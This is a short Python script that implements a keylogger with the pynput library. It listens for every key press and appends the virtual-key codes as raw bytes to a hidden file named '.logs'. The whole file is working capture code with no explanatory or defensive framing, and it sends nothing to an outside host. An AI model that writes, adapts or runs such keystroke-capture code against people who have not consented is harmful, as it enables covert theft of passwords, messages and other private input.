#!/usr/bin/env python3

from pynput import keyboard


class KeyLogger():
    def __init__(self, filename: str = ".logs") -> None:
        self.filename = filename

    @staticmethod
    def get_char(key):
        try:
            return key.char
        except AttributeError:
            return str(key)

    def on_press(self, key):
        with open(self.filename, 'ab') as logs:
            logs.write(key.vk.to_bytes(2, byteorder="big") if isinstance(key, keyboard.KeyCode)
                else keyboard.Key(key).value.vk.to_bytes(2, byteorder="big"))

    def main(self):
        listener = keyboard.Listener(
            on_press=self.on_press,
        )
        listener.start()


if __name__ == '__main__':
    logger = KeyLogger()
    logger.main()
    input()
